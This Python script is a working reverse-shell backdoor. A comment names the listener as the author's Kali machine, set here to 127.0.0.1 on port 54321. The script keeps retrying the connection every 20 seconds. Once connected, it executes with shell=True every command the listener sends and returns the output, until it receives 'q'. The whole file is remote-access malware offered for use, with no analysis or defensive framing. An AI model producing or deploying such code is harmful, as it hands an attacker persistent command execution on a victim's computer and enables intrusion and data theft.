import socket
import subprocess
import json
import time

def reliable_send(data):                 #fun to reliably send data to server
    json_data = json.dumps(data)
    s.send(json_data.encode())

def reliable_recv():                     #fun to reliably recieve data from server
    json_data = ""
    while True:
        try:
            json_data = json_data + s.recv(1024).decode()
            return json.loads(json_data)
        except ValueError:
            continue

def connection():                        # fun to try to connect to server after every 20 sec
    time.sleep(20)
    try:
        s.connect(("127.0.0.1",54321))     #(our kali's address,port)
        shell()
    except:
        connection()

def shell():                            #fun to process shell commands
    while True:
        command = reliable_recv()
        if command == "q":
            break
        else:
            try:
                proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                result = proc.stdout.read() + proc.stderr.read()
                result_str = result.decode(errors='replace')
                reliable_send(result_str)
            except:
                reliable_send("[!!] Can't Execute That Command")

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

connection()
s.close()